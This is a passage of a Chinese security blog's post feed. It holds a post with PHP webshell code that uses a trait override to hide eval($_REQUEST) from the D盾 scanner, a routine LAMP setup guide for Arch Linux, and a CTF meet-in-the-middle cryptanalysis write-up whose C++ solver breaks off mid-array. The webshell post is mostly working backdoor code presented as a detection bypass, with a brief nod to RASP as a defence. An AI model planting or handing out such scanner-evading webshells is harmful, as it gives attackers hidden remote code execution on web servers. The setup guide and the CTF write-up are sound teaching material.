    <content><![CDATA[<p>帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了.</p>
<a id="more"></a>

<p>这个特性已经写在 Title 里面了, 具体可以参考 <a href="https://www.php.net/traits" target="_blank" rel="noopener">php.net</a> 上的介绍,<br>说人话就是覆盖方法, 于是我们就可以覆盖父类的方法, 把无害的变成有害的.  </p>
<p>不废话, 直接看 shell 代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> T &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"$this-&gt;s"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I am innocent"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;s = $_REQUEST[<span class="string">'s'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">T</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dynamic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br></pre></td></tr></table></figure>

<p>可以看到用 T 的 <code>dynamic</code> 覆盖了 B 的 <code>dynamic</code>, 导致了代码执行,<br>个人猜测是 D 盾不支持 <code>trait</code>, 没有把里面的 eval 当成代码, 直接给跳过了.  </p>
<p><img src="https://i.loli.net/2019/07/25/5d395c8b9e25359401.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8b9b5f447606.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8bbdf0329396.png" alt="">  </p>
<p>而且很神奇的是, 在这一段下面放一段本来过不了的, 也能过 D 盾了.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;c = $_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> B();</span><br><span class="line">$d-&gt;a();</span><br></pre></td></tr></table></figure>

<p>感觉 D 盾内应该有好几种引擎, trait 把其中基于数据流的引擎给搞崩了? 于是也就能过了.<br>比较的谜…</p>
<p>最后, PHP 这种动态语言, 静态查杀的难度是真的大…<br>特别涉及类, 过 D 盾的姿势非常多, 百度随便搜搜就有一堆. 想要真正防止, 还是靠 rasp 这种技术吧.<br>hook eval, 然后检测数据流是否来自 $_POST, $_GET 等等</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>在 ArchLinux 上安装 LAMP</title>
    <url>/2018/11/30/%E5%9C%A8%20ArchLinux%20%E4%B8%8A%E5%AE%89%E8%A3%85%20LAMP/</url>
    <content><![CDATA[<p>在平常总得遇到点题目得测试 / 复现一下, 如果本地就有全套 LAMP 环境的话就会方便很多.</p>
<h3 id="0x01-首先安装对应的软件包"><a href="#0x01-首先安装对应的软件包" class="headerlink" title="0x01 首先安装对应的软件包"></a>0x01 首先安装对应的软件包</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S apache mariadb mariadb-clients php php56 php-apache php56-apache</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p><code>mariadb</code> 是 <code>oracle</code> 收购 <code>mysql</code> 后开源社区的 fork, 可以理解为备份… 防止<code>oracle</code> 突然修改 <code>mysql</code> 的协议. php -&gt; php7, php56 -&gt; php5, <code>php-apache</code> 是对应的 <code>apache</code> 模块, 因为我们只是本地测试用, 就不搞 <code>php-fpm</code> 了</p>
<h3 id="0x02-修改配置文件"><a href="#0x02-修改配置文件" class="headerlink" title="0x02 修改配置文件"></a>0x02 修改配置文件</h3><h4 id="1-apache"><a href="#1-apache" class="headerlink" title="1. apache"></a>1. apache</h4><p><code>sudo vim /etc/httpd/conf/httpd.conf</code> 将 <code>LoadModule mpm_event_module modules/mod_mpm_event.so</code> 注释掉, 并将 <code>LoadModule mpm_prefork_module modules/mod_mpm_prefork.so</code> 前面的注释给删掉, 因为 <code>php-apache</code> 只支持 <code>pre-fork</code> 模式. 将 <code>ServerName www.example.com:80</code> 修改成 <code>ServerName 127.0.0.1:80</code>, 其他地址同理 然后加上</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Load php7</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">LoadModule</span></span> php7_module modules/libphp7.so </span><br><span class="line"><span class="attribute">Include</span> conf/extra/php7_module.conf</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Load php56</span></span><br><span class="line"><span class="comment"># LoadModule php5_module modules/libphp56.so</span></span><br><span class="line"><span class="comment"># Include conf/extra/php56_module.conf</span></span><br></pre></td></tr></table></figure>

<p>注意只能同时启动一个, 不能同时启动 <code>php7</code> 和 <code>php56</code></p>
<h4 id="2-mariadb"><a href="#2-mariadb" class="headerlink" title="2. mariadb"></a>2. mariadb</h4><p>初始化数据库 <code>sudo mysql_install_db --basedir=/usr --user=mysql --datadir=/var/lib/mysql</code> 启动服务 <code>systemctl start mysqld</code> 设置 <code>root</code> 密码 <code>sudo /usr/bin/mysqladmin -u root password &#39;{password}&#39;</code></p>
<h4 id="3-php"><a href="#3-php" class="headerlink" title="3. php"></a>3. php</h4><p><code>sudo vim /etc/php/php.ini</code> (php5 同理) 启用扩展, 去掉前面的分号注释就可以了 <code>extension=mysqli</code> 加上 <code>unix socket</code> 的地址 <code>mysqli.default_socket = /run/mysqld/mysqld.sock</code> 启用报错 (默认是关闭的) <code>display_errors = On</code></p>
<h4 id="4-phpmyadmin"><a href="#4-phpmyadmin" class="headerlink" title="4. phpmyadmin"></a>4. phpmyadmin</h4><p>在<a href="https://www.phpmyadmin.net/" target="_blank" rel="noopener">官网</a>下载后直接解压到 <code>/srv/http</code> 就行, 比较方便, 如果不想提示 blowfish 密码的话, 就在 <code>phpMyAdmin/libraries/config.default.php</code> 里面的 <code>$cfg[&#39;blowfish_secret&#39;]</code> 后面随便加上点什么就行了.</p>
<h3 id="0x03-启动-apache"><a href="#0x03-启动-apache" class="headerlink" title="0x03 启动 apache"></a>0x03 启动 apache</h3><p><code>sudo apachectl start</code> 重启就是 <code>sudo apachectl restart</code> 注意想要 php.ini 的修改生效也得重启 apache, 然后就可以访问 <code>http://127.0.0.1</code> 看到成功启动了~ 可以打个 <code>phpinfo()</code> 看看 php 有没有成功启动. 可以看到 <code>Linux</code> 下配置还是挺简单 0.0, 不是很麻烦.</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道 CTF 题了解密码学中的 Meet-in-the-middle 攻击</title>
    <url>/2019/03/25/%E4%BB%8E%E4%B8%80%E9%81%93-CTF-%E9%A2%98%E4%BA%86%E8%A7%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84-Meet-in-the-middle-%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>本文首发于<a href="https://xz.aliyun.com/t/4056" target="_blank" rel="noopener">先知</a>  </p>
<p>在家里无聊打了 nullcon, 其中有一题用到了 <code>Meet-in-the-middle</code> 这种攻击方式,<br>在这里分享给大家.  </p>
<a id="more"></a>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">24 bit key space is brute forceable so how about 48 bit key space? flag is hackim19&#123;decrypted flag&#125;</span><br><span class="line"></span><br><span class="line">16 bit plaintext: b&#39;0467a52afa8f15cfb8f0ea40365a6692&#39; flag: b&#39;04b34e5af4a1f5260f6043b8b9abb4f8&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key, flag</span><br><span class="line">BLOCK_LENGTH = <span class="number">16</span></span><br><span class="line">KEY_LENGTH = <span class="number">3</span></span><br><span class="line">ROUND_COUNT = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">210</span>, <span class="number">213</span>, <span class="number">115</span>, <span class="number">178</span>, <span class="number">122</span>, <span class="number">4</span>, <span class="number">94</span>, <span class="number">164</span>, <span class="number">199</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">248</span>, <span class="number">54</span>,</span><br><span class="line">        <span class="number">217</span>, <span class="number">156</span>, <span class="number">202</span>, <span class="number">212</span>, <span class="number">177</span>, <span class="number">132</span>, <span class="number">36</span>, <span class="number">245</span>, <span class="number">31</span>, <span class="number">163</span>, <span class="number">49</span>, <span class="number">68</span>, <span class="number">107</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">251</span>, <span class="number">134</span>, <span class="number">242</span>, <span class="number">59</span>, <span class="number">46</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">185</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">184</span>, <span class="number">221</span>,</span><br><span class="line">        <span class="number">63</span>, <span class="number">10</span>, <span class="number">42</span>, <span class="number">28</span>, <span class="number">104</span>, <span class="number">56</span>, <span class="number">155</span>, <span class="number">43</span>, <span class="number">250</span>, <span class="number">161</span>, <span class="number">22</span>, <span class="number">92</span>, <span class="number">81</span>,</span><br><span class="line">        <span class="number">201</span>, <span class="number">229</span>, <span class="number">183</span>, <span class="number">214</span>, <span class="number">208</span>, <span class="number">66</span>, <span class="number">128</span>, <span class="number">162</span>, <span class="number">172</span>, <span class="number">147</span>, <span class="number">1</span>, <span class="number">74</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">227</span>, <span class="number">247</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">203</span>, <span class="number">170</span>, <span class="number">228</span>, <span class="number">226</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">119</span>,</span><br><span class="line">        <span class="number">123</span>, <span class="number">67</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">240</span>, <span class="number">13</span>, <span class="number">52</span>, <span class="number">255</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">219</span>, <span class="number">188</span>, <span class="number">99</span>,</span><br><span class="line">        <span class="number">82</span>, <span class="number">158</span>, <span class="number">14</span>, <span class="number">241</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">108</span>, <span class="number">198</span>, <span class="number">85</span>, <span class="number">72</span>, <span class="number">192</span>, <span class="number">236</span>, <span class="number">129</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">220</span>, <span class="number">96</span>, <span class="number">71</span>, <span class="number">98</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">120</span>, <span class="number">243</span>, <span class="number">109</span>, <span class="number">23</span>, <span class="number">48</span>,</span><br><span class="line">        <span class="number">97</span>, <span class="number">234</span>, <span class="number">187</span>, <span class="number">244</span>, <span class="number">12</span>, <span class="number">139</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">38</span>, <span class="number">216</span>, <span class="number">90</span>, <span class="number">125</span>,</span><br><span class="line">        <span class="number">106</span>, <span class="number">24</span>, <span class="number">235</span>, <span class="number">207</span>, <span class="number">186</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">232</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">200</span>,</span><br><span class="line">        <span class="number">70</span>, <span class="number">137</span>, <span class="number">152</span>, <span class="number">165</span>, <span class="number">19</span>, <span class="number">166</span>, <span class="number">154</span>, <span class="number">112</span>, <span class="number">142</span>, <span class="number">180</span>, <span class="number">167</span>, <span class="number">57</span>, <span class="number">153</span>,</span><br><span class="line">        <span class="number">174</span>, <span class="number">8</span>, <span class="number">146</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">150</span>, <span class="number">206</span>, <span class="number">141</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">9</span>, <span class="number">65</span>,</span><br><span class="line">        <span class="number">176</span>, <span class="number">79</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">30</span>, <span class="number">218</span>, <span class="number">197</span>, <span class="number">140</span>, <span class="number">168</span>, <span class="number">196</span>, <span class="number">83</span>,</span><br><span class="line">        <span class="number">223</span>, <span class="number">144</span>, <span class="number">55</span>, <span class="number">58</span>, <span class="number">157</span>, <span class="number">173</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">103</span>, <span class="number">40</span>, <span class="number">246</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">73</span>, <span class="number">179</span>, <span class="number">160</span>, <span class="number">253</span>, <span class="number">225</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">224</span>, <span class="number">29</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">117</span>,</span><br><span class="line">        <span class="number">100</span>, <span class="number">233</span>, <span class="number">181</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">5</span>, <span class="number">149</span>, <span class="number">204</span>, <span class="number">182</span>, <span class="number">138</span>, <span class="number">211</span>, <span class="number">16</span>, <span class="number">231</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">238</span>, <span class="number">254</span>, <span class="number">252</span>, <span class="number">6</span>, <span class="number">195</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">136</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">118</span>, <span class="number">222</span>,</span><br><span class="line">        <span class="number">20</span>, <span class="number">249</span>, <span class="number">64</span>, <span class="number">130</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">7</span>, <span class="number">121</span>, <span class="number">135</span>, <span class="number">189</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">50</span>, <span class="number">148</span>, <span class="number">159</span>, <span class="number">93</span>, <span class="number">80</span>, <span class="number">45</span>, <span class="number">17</span>, <span class="number">205</span>, <span class="number">95</span>]</span><br><span class="line">p = [<span class="number">3</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">14</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytearray(map(<span class="keyword">lambda</span> s: s[<span class="number">0</span>] ^ s[<span class="number">1</span>], zip(a, b)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(key, pt)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(pt) == BLOCK_LENGTH</span><br><span class="line">    <span class="keyword">assert</span> len(key) == KEY_LENGTH</span><br><span class="line">    key = bytearray(unhexlify(md5(key).hexdigest()))</span><br><span class="line">    ct = bytearray(pt)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUND_COUNT):</span><br><span class="line">        ct = xor(ct, key)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(BLOCK_LENGTH):</span><br><span class="line">            ct[i] = sbox[ct[i]]</span><br><span class="line">        nct = bytearray(BLOCK_LENGTH)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(BLOCK_LENGTH):</span><br><span class="line">            nct[i] = ct[p[i]]</span><br><span class="line">        ct = nct</span><br><span class="line">    <span class="keyword">return</span> hexlify(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toofun</span><span class="params">(key, pt)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) == <span class="number">2</span> * KEY_LENGTH</span><br><span class="line">    key1 = key[:KEY_LENGTH]</span><br><span class="line">    key2 = key[KEY_LENGTH:]</span><br><span class="line"></span><br><span class="line">    ct1 = unhexlify(fun(key1, pt))</span><br><span class="line">    ct2 = fun(key2, ct1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ct2</span><br><span class="line"></span><br><span class="line">print(<span class="string">"16 bit plaintext: %s"</span> % toofun(key, <span class="string">b"16 bit plaintext"</span>))</span><br><span class="line">print(<span class="string">"flag: %s"</span> % toofun(key, flag))</span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们的目标就是通过给出的明文 <code>16 bit plaintext</code> 和对应的密文 <code>0467a52afa8f15cfb8f0ea40365a6692</code><br>算出 key, 从而解密 flag 密文 <code>04b34e5af4a1f5260f6043b8b9abb4f8</code>  </p>
<p>根据加密代码和题目描述, 很显然方法只有爆破一种, 但是爆破 6 位 key 的 <code>2**48</code>(281,474,976,710,656) 种可能是不现实的.<br>但正如题目中所说, 爆破 <code>2**24</code>(16,777,216) 还是非常简单的.  </p>
<p>现在我们的问题变成如何简化这个爆破过程, 这里就要用到一开始说的 <code>Meet-in-the-middle</code> 攻击,<br>加密主要是这两个函数,  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(key, pt)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(pt) == BLOCK_LENGTH</span><br><span class="line">    <span class="keyword">assert</span> len(key) == KEY_LENGTH</span><br><span class="line">    key = bytearray(unhexlify(md5(key).hexdigest()))</span><br><span class="line">    ct = bytearray(pt)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUND_COUNT):</span><br><span class="line">        ct = xor(ct, key)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(BLOCK_LENGTH):</span><br><span class="line">            ct[i] = sbox[ct[i]]</span><br><span class="line">        nct = bytearray(BLOCK_LENGTH)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(BLOCK_LENGTH):</span><br><span class="line">            nct[i] = ct[p[i]]</span><br><span class="line">        ct = nct</span><br><span class="line">    <span class="keyword">return</span> hexlify(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toofun</span><span class="params">(key, pt)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) == <span class="number">2</span> * KEY_LENGTH</span><br><span class="line">    key1 = key[:KEY_LENGTH]</span><br><span class="line">    key2 = key[KEY_LENGTH:]</span><br><span class="line"></span><br><span class="line">    ct1 = unhexlify(fun(key1, pt))</span><br><span class="line">    ct2 = fun(key2, ct1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ct2</span><br></pre></td></tr></table></figure>

<p>发现其实真正的加密函数是 <code>fun</code>, 在 <code>toofun</code> 中调用了两次<br>而且这里并没有将 6 位长的 key 一次性使用, 而是将其从中间分开, 先用前 3 位加密一次, 再用后 3 位加密一次.<br>也就是说实际的加密过程是用两个 3 位的 key 连续加密二次.<br>这就让我们的攻击有了可能性.  </p>
<p>虽然也是爆破, 但是与一开始的最先能想到的爆破 6 位 key 不同的是<br>我们先遍历所有 3 位长的 key, 算出 <code>16 bit plaintext</code> 对应的所有第一次加密结果, 将其保存起来,<br>然后再遍历一次 key, 将密文解密, 如果能在第一次加密的结果中找到, 那么对应的两个 3 位 key 拼起来就是一开始的 6 位 key.<br>然后用这个 key 就可以解密出 flag 了~<br>现在能感觉到这个攻击的名字取的还是非常切题的, 一边加密, 一边解密, 在中间碰头得到秘钥.  </p>
<p>与一开始的解法相比, 我们成功的将 <code>2**48</code> 降到 <code>2*2**24</code>, 不过对应的是需要一个哈希表来保存所有第一次加密的结果,<br>相当于用空间换时间了, 好在现在内存都比较大, 应付起来很轻松.  </p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>因为 python 不太适合这种大量数据的爆破, 所以就用 C++ 写了, 写的比较烂请见谅  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"md5.cpp"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BLOCK_LENGTH = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ROUND_COUNT = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> uchar;</span><br><span class="line"></span><br><span class="line">uchar sbox[]  = &#123;<span class="number">210</span>, <span class="number">213</span>, <span class="number">115</span>, <span class="number">178</span>, <span class="number">122</span>, <span class="number">4</span>, <span class="number">94</span>, <span class="number">164</span>, <span class="number">199</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">248</span>, <span class="number">54</span>,</span><br><span class="line">                 <span class="number">217</span>, <span class="number">156</span>, <span class="number">202</span>, <span class="number">212</span>, <span class="number">177</span>, <span class="number">132</span>, <span class="number">36</span>, <span class="number">245</span>, <span class="number">31</span>, <span class="number">163</span>, <span class="number">49</span>, <span class="number">68</span>, <span class="number">107</span>,</span><br><span class="line">                 <span class="number">91</span>, <span class="number">251</span>, <span class="number">134</span>, <span class="number">242</span>, <span class="number">59</span>, <span class="number">46</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">185</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">184</span>, <span class="number">221</span>,</span><br><span class="line">                 <span class="number">63</span>, <span class="number">10</span>, <span class="number">42</span>, <span class="number">28</span>, <span class="number">104</span>, <span class="number">56</span>, <span class="number">155</span>, <span class="number">43</span>, <span class="number">250</span>, <span class="number">161</span>, <span class="number">22</span>, <span class="number">92</span>, <span class="number">81</span>,</span><br><span class="line">                 <span class="number">201</span>, <span class="number">229</span>, <span class="number">183</span>, <span class="number">214</span>, <span class="number">208</span>, <span class="number">66</span>, <span class="number">128</span>, <span class="number">162</span>, <span class="number">172</span>, <span class="number">147</span>, <span class="number">1</span>, <span class="number">74</span>, <span class="number">15</span>,</span><br><span class="line">                 <span class="number">151</span>, <span class="number">227</span>, <span class="number">247</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">203</span>, <span class="number">170</span>, <span class="number">228</span>, <span class="number">226</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">119</span>,</span><br><span class="line">                 <span class="number">123</span>, <span class="number">67</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">240</span>, <span class="number">13</span>, <span class="number">52</span>, <span class="number">255</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">219</span>, <span class="number">188</span>, <span class="number">99</span>,</span><br><span class="line">                 <span class="number">82</span>, <span class="number">158</span>, <span class="number">14</span>, <span class="number">241</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">108</span>, <span class="number">198</span>, <span class="number">85</span>, <span class="number">72</span>, <span class="number">192</span>, <span class="number">236</span>, <span class="number">129</span>,</span><br><span class="line">                 <span class="number">131</span>, <span class="number">220</span>, <span class="number">96</span>, <span class="number">71</span>, <span class="number">98</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">120</span>, <span class="number">243</span>, <span class="number">109</span>, <span class="number">23</span>, <span class="number">48</span>,</span><br><span class="line">                 <span class="number">97</span>, <span class="number">234</span>, <span class="number">187</span>, <span class="number">244</span>, <span class="number">12</span>, <span class="number">139</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">38</span>, <span class="number">216</span>, <span class="number">90</span>, <span class="number">125</span>,</span><br><span class="line">                 <span class="number">106</span>, <span class="number">24</span>, <span class="number">235</span>, <span class="number">207</span>, <span class="number">186</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">232</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">200</span>,</span><br><span class="line">                 <span class="number">70</span>, <span class="number">137</span>, <span class="number">152</span>, <span class="number">165</span>, <span class="number">19</span>, <span class="number">166</span>, <span class="number">154</span>, <span class="number">112</span>, <span class="number">142</span>, <span class="number">180</span>, <span class="number">167</span>, <span class="number">57</span>, <span class="number">153</span>,</span><br><span class="line">                 <span class="number">174</span>, <span class="number">8</span>, <span class="number">146</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">150</span>, <span class="number">206</span>, <span class="number">141</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">9</span>, <span class="number">65</span>,</span><br><span class="line">                 <span class="number">176</span>, <span class="number">79</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">30</span>, <span class="number">218</span>, <span class="number">197</span>, <span class="number">140</span>, <span class="number">168</span>, <span class="number">196</span>, <span class="number">83</span>,</span><br><span class="line">                 <span class="number">223</span>, <span class="number">144</span>, <span class="number">55</span>, <span class="number">58</span>, <span class="number">157</span>, <span class="number">173</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">103</span>, <span class="number">40</span>, <span class="number">246</span>,</span><br><span class="line">                 <span class="number">169</span>, <span class="number">73</span>, <span class="number">179</span>, <span class="number">160</span>, <span class="number">253</span>, <span class="number">225</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">224</span>, <span class="number">29</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">117</span>,</span><br><span class="line">                 <span class="number">100</span>, <span class="number">233</span>, <span class="number">181</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">5</span>, <span class="number">149</span>, <span class="number">204</span>, <span class="number">182</span>, <span class="number">138</span>, <span class="number">211</span>, <span class="number">16</span>, <span class="number">231</span>,</span><br><span class="line">                 <span class="number">0</span>, <span class="number">238</span>, <span class="number">254</span>, <span class="number">252</span>, <span class="number">6</span>, <span class="number">195</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">136</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">118</span>, <span class="number">222</span>,</span><br><span class="line">                 <span class="number">20</span>, <span class="number">249</span>, <span class="number">64</span>, <span class="number">130</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">7</span>, <span class="number">121</span>, <span class="number">135</span>, <span class="number">189</span>, <span class="number">215</span>,</span><br><span class="line">                 <span class="number">50</span>, <span class="number">148</span>, <span class="number">159</span>, <span class="number">93</span>, <span class="number">80</span>, <span class="number">45</span>, <span class="number">17</span>, <span class="number">205</span>, <span class="number">95</span></span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> p[] = &#123;<span class="number">3</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">14</span>&#125;;</span><br><span class="line"></span><br><span class="line">uchar dbox[] = &#123;<span class="number">221</span>, <span class="number">62</span>, <span class="number">140</span>, <span class="number">111</span>, <span class="number">5</span>, <span class="number">213</span>, <span class="number">225</span>, <span class="number">242</span>, <span class="number">157</span>, <span class="number">167</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">121</span>,</span><br><span class="line">                <span class="number">83</span>, <span class="number">93</span>, <span class="number">64</span>, <span class="number">219</span>, <span class="number">253</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">234</span>, <span class="number">212</span>, <span 